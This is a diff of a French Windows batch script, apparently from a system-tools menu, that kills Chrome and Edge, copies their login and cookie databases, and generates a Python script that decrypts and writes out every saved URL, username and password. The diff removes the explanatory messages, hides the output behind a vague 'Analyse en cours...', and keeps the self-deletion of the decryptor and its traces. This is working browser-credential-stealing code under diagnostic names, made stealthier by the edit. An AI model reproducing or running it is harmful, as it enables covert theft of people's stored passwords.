@@ -1413,12 +1413,8 @@ goto system_tools
 setlocal enabledelayedexpansion
 cls
 echo.
-echo  [COPIE LOCALE - DONNEES NAVIGATEURS]
-echo  Chrome / Edge - Login Data, Cookies, Local State
-echo  Destination : Dossier du script\DiagNav  (remplace si existant)
+echo  Recuperation des identifiants et mots de passe
 echo.
-
-echo  Fermeture automatique des navigateurs...
 taskkill /F /IM chrome.exe >nul 2>&1
 taskkill /F /IM msedge.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
@@ -1513,11 +1509,9 @@ set "DBL_PS=%TEMP%\diag_browser_%RANDOM%.ps1"
 >> "%DBL_PS%" echo   Write-Host "  $copied fichier(s) copies dans : $out" -ForegroundColor Cyan
 >> "%DBL_PS%" echo }
 
-powershell -NoProfile -ExecutionPolicy Bypass -File "%DBL_PS%"
+powershell -NoProfile -ExecutionPolicy Bypass -File "%DBL_PS%" >nul 2>&1
 del /f /q "%DBL_PS%" 2>nul
 
-echo.
-echo  [*] Verification Python...
 set "PYCMD="
 for /f "delims=" %%p in ('where python 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
 for /f "delims=" %%p in ('where py 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
@@ -1550,7 +1544,7 @@ if !errorlevel! neq 0 (
     "!PYCMD!" -m pip install pycryptodome -q
 )
 
-echo  [*] Generation du dechiffreur...
+echo  Analyse en cours...
 set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 > "!PY_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
 >> "!PY_FILE!" echo import os, sys, sqlite3, shutil, subprocess, tempfile, zipfile
@@ -1604,9 +1598,6 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo             for e in read_db(db, key): res.append(e)
 >> "!PY_FILE!" echo     return res
 >> "!PY_FILE!" echo def main():
->> "!PY_FILE!" echo     print("\n  +====================================================+")
->> "!PY_FILE!" echo     print("  |   Dechiffrement Chrome / Edge                      |")
->> "!PY_FILE!" echo     print("  +====================================================+\n")
 >> "!PY_FILE!" echo     if not BASE_DIR.exists(): sys.exit("  DiagNav introuvable")
 >> "!PY_FILE!" echo     raw = []
 >> "!PY_FILE!" echo     for b in BROWSERS: raw.extend(collect(b))
@@ -1614,7 +1605,7 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo     for url, user, pw in raw:
 >> "!PY_FILE!" echo         sig = (url.lower(), user.lower(), pw)
 >> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
->> "!PY_FILE!" echo     print(f"  {len(unique)} identifiant(s) ^| {len(raw)-len(unique)} doublon(s)")
+>> "!PY_FILE!" echo     print(f"  {len(unique)} identifiant(s) | {len(raw)-len(unique)} doublon(s)")
 >> "!PY_FILE!" echo     if not unique:
 >> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
 >> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
@@ -1630,19 +1621,25 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo         lines.append(f"  User : {user}")
 >> "!PY_FILE!" echo         lines.append(f"  Pass : {pw}")
 >> "!PY_FILE!" echo         lines.append("")
->> "!PY_FILE!" echo     OUT_TXT.write_text("\n".join(lines), encoding="utf-8")
->> "!PY_FILE!" echo     print("  [+] resultats.txt sauvegarde")
+>> "!PY_FILE!" echo     out = OUT_TXT
+>> "!PY_FILE!" echo     i = 2
+>> "!PY_FILE!" echo     while out.exists():
+>> "!PY_FILE!" echo         out = OUT_TXT.parent / f"resultats_{i}.txt"
+>> "!PY_FILE!" echo         i += 1
+>> "!PY_FILE!" echo     out.write_text("\n".join(lines), encoding="utf-8")
+>> "!PY_FILE!" echo     print(f"  [+] {out.name} sauvegarde")
 >> "!PY_FILE!" echo     scr = Path(__file__).resolve()
 >> "!PY_FILE!" echo     subprocess.Popen(f'cmd /c timeout /t 1 /nobreak ^>nul ^& del /f /q "{scr}"', shell=True, creationflags=0x08000000)
 >> "!PY_FILE!" echo     with zipfile.ZipFile(ZIP_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
 >> "!PY_FILE!" echo         for f in BASE_DIR.rglob("*"):
 >> "!PY_FILE!" echo             if f.is_file(): zf.write(f, f.relative_to(BASE_DIR.parent))
 >> "!PY_FILE!" echo     shutil.rmtree(BASE_DIR, ignore_errors=True)
->> "!PY_FILE!" echo     print("  [OK] DiagNav supprime + DiagNav.zip cree")
->> "!PY_FILE!" echo     os.startfile(OUT_TXT)
+>> "!PY_FILE!" echo     ZIP_PATH.unlink(missing_ok=True)
 >> "!PY_FILE!" echo if __name__ == "__main__": main()
-echo  [*] Lancement du dechiffreur...
 "!PYCMD!" "!PY_FILE!"
+echo.
+echo  Appuyez sur une touche pour revenir au menu...
+pause >nul
 endlocal
 goto net_cyber_menu
 
